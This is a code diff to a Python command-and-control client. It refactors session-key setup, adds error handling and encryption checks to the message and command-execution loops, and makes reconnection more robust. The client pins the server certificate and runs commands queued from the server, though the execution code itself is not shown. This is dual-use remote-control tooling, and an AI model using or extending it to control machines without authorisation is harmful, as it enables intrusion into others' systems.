@@ -21,6 +21,7 @@ from models.message import Message
 from models.send_receive_msgs import send_message, receive_message
 from models.message_type import MessageType
 from models.command_type import CommandType
+from models.key_manager import KeyManager
 from models.encryption_manager import EncryptionManager
 from models.tls_helper import TLSSessionHelper
 
@@ -38,7 +39,7 @@ from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
 import base64
 
-def get_spki_hash(der_cert_bytes):
+def get_spki_hash(der_cert_bytes: bytes) -> str:
     cert = x509.load_der_x509_certificate(der_cert_bytes)
     public_key = cert.public_key()
     spki_bytes = public_key.public_bytes(
@@ -57,7 +58,8 @@ class C2Client:
         self.server_host = server_host
         self.server_port = server_port
         self.client_id = client_id
-        self._encryption_manager = EncryptionManager()
+        self.key_manager = KeyManager()
+        self._encryption_manager = None
         self.reader = None
         self.writer = None
         self.running = True
@@ -69,8 +71,8 @@ class C2Client:
         Connect to C2 server and register
         """
         server_sha = "jPxWXE+5YqcWif1pSG7ixZAVbFY3bI1JhbbtaOcPxFM="
+        is_connected = False
         try:
-            is_connected = False
             if not self.running:
                 return False
             ssl_ctx = TLSSessionHelper().create_context(
@@ -90,21 +92,24 @@ class C2Client:
             logger.info(f"Expected certificate: {server_sha}")
             if server_sha_received != server_sha:
                 logger.error("Server certificate is not valid")
+                await self._reset_writer_reader()
                 return False
 
-            # Send registration message
-            serialized_public_key = self._encryption_manager.serialized_public_key
+            # Send registration message with client's public key
+            client_public_key = self.key_manager.serialized_public_key
             await send_message(
                 self.writer,
-                Message.as_register(self.client_id, serialized_public_key).to_payload(True)
+                Message.as_register(self.client_id, client_public_key).to_payload(True)
             )
             
-            # Receive acknowledgment
+            # Receive acknowledgment with server's public key
             msg = await receive_message(self.reader)
             msg = Message.from_payload(msg)
             if msg and msg.type is MessageType.ACK:
-                self._encryption_manager.compute_session_key(msg.command)
-                logger.info(f"Shared key: {self._encryption_manager.session_key}")
+                # Setup encryption with server's public key
+                session_key = self.key_manager.compute_session_key(msg.command)
+                self._encryption_manager = EncryptionManager(session_key)
+                logger.info(f"Encryption established for client: {self.client_id}")
                 logger.info(f"Registered as {msg.client_id}")
                 is_connected = True
             else:
@@ -143,6 +148,7 @@ class C2Client:
             logger.info("Reconnect loop cancelled")
         except Exception as e:
             logger.error(f"Reconnect loop error: {e}")
+            await self._reset_writer_reader()
     
     async def main_loop(self):
         """
@@ -168,11 +174,15 @@ class C2Client:
             await self._reset_writer_reader()
 
     async def _reset_writer_reader(self):
-        if self.writer and not self.writer.is_closing():
-            self.writer.close()
-            await self.writer.wait_closed()
-        self.reader = None
-        self.writer = None
+        try:
+            if self.writer and not self.writer.is_closing():
+                self.writer.close()
+                await self.writer.wait_closed()
+        except Exception as e:
+            logger.error(f"Error closing writer: {e}")
+        finally:
+            self.reader = None
+            self.writer = None
 
     async def _monitor(self, tasks: List[asyncio.Task]):
         """
@@ -213,9 +223,14 @@ class C2Client:
                 if not msg:
                     logger.warning(f"Received an empty message")
                     break
+                
+                if not self._encryption_manager:
+                    logger.error("Encryption not established")
+                    break
+                    
                 msg = self._encryption_manager.decrypt(msg)
                 if not msg:
-                    logger.warning(f"Unexpected: decrypted message is empty")
+                    logger.warning(f"Failed to decrypt message")
                     break
                 
                 if msg.type is MessageType.COMMAND:
@@ -240,15 +255,19 @@ class C2Client:
         """
         Execute commands from queue
         """
+        loop = asyncio.get_event_loop()
         try:
-            loop = asyncio.get_event_loop()
             while self.running:
                 # Get command with timeout
                 # cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                 cmd_data = await self.command_queue.get()
                 
                 cmd_id = cmd_data.get("cmd_id")
-                command = cmd_data.get("command").lower()
+                command = cmd_data.get("command", "").lower()
+                
+                if not self._encryption_manager:
+                    logger.error("Encryption not established")
+                    break
                 
                 logger.info(f"Executing: {command}")
                 
@@ -329,9 +348,13 @@ class C2Client:
         
         # Start with reconnect loop - it handles both initial connection and reconnections
         while self.running:
-            await self.reconnect_loop()
-            if self.reader and self.writer:
-                await self.main_loop()
+            try:
+                await self.reconnect_loop()
+                if self.reader and self.writer:
+                    await self.main_loop()
+            except Exception as e:
+                logger.error(f"Client start error: {e}")
+                await asyncio.sleep(1)  # Prevent tight loop on repeated failures
 
 # ==================== MAIN ====================
 
